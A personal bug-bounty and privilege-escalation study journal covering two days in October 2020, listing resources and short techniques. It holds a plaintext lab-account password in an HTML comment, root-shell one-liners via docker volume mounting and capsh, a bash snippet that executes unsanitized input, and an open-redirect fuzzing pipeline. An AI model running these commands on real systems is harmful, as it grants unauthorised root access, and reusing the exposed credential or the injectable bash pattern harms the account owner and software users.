``` Day01 ```

-----------------------------------
Abu Syed Rahat | 08 October, 2020

-----------------------------------
# Completed Task

1. Created PortsSwigger lab account.

<!-- 
    username: abusyed.rahat2016@gmail.com
    password: xiM3k3nc/6bS76!pCH3r5D42C55Fq2of 
-->
2. Learned Git technology.

# PrivEsc

    1.PrivEsc through Docker 
    
# command : docker run -v /:/mnt --rm -it alpine chroot /mnt sh 
resource: https://gtfobins.github.io/gtfobins/docker/#sudo

details:
user need to be listed in docker groups

    2. Unsanitized Bash input.
`
#!/bin/bash
read -p "input goes here:" massage
$masage 2> /dev/null `


# RESOUCES:

learn about <a herf="https://lolbas-project.github.io/">LOLBAS </a>. Which is similer to <a herf="https://gtfobins.github.io/">  GTFOBins </a>

<a herf="https://www.ikotler.org/docs/InYourPythonPath.pdf"> Python-backdoor </a>

# BUG-BOUNTY

<a herf=" https://speakerdeck.com/harshbothra/offensive-recon-for-bug-bounty-hunters?slide=5"> harsh-bothra-slides </a> <br>
make sure checked Bheem project over github.

<a herf="https://twitter.com/gkhck_/status/1313176674121457666"> http-host-header-attack@Hacker0ne-reports</a><br>

<a herf="https://naglinagli.github.io/BugBounty/"> Modern interpretation of The Web Application Hackers Handbook </a> <br>

<a herf="https://github.com/In3tinct/Taken"> automate subdomain-takeover </a>

# Easy-Hacks
    one-liner open redirection
` gau http://testphp.vulnweb.com | tee -a archive 1>/dev/null && gf redirect archive | qsreplace FUZZ | cut -f 3- -d ':' | while read url; do ffuf -w word -u "$url" -c=true -sa=true -sf=true -se=true -mc=302 -v 2>/dev/null ; done `

<br>


<h1> Day02 </h1>
------------------
Abu Syed Rahat , Oct 09 2020

------------------

# PrivEsc

privesc through <b> capsh - "capability shell wrapper" </b> `/usr/sbin/capsh `

attack-vector: `/usr/bin/capsh --user=root -- `

shell will be pop out as root. check man page for more details. 

# BUG-BOUNTY

<h3> Use subjs and linkfinder for js files extraction  </h3>
<a herf="https://github.com/bittentech/SecScraper.git"> hackerone-and-medium-bug-bounty-reports-grabber </a> <br>

<a herf="https://github.com/yunemse48/403bypasser"> 403 bypasser github tools</a> <br>
<!-- https://twitter.com/iam_j0ker/status/1303658167205728256 -->
<img src="https://pbs.twimg.com/media/EheFZJvVgAEuzZ1?format=png&name=small"> 

# story:
- subdomain enumeration
- extract internal adminendpoints form js files
- Fuzz internal endpoints
- look for redirects (eg. 301,302)
- use noredirect bypass admin panel

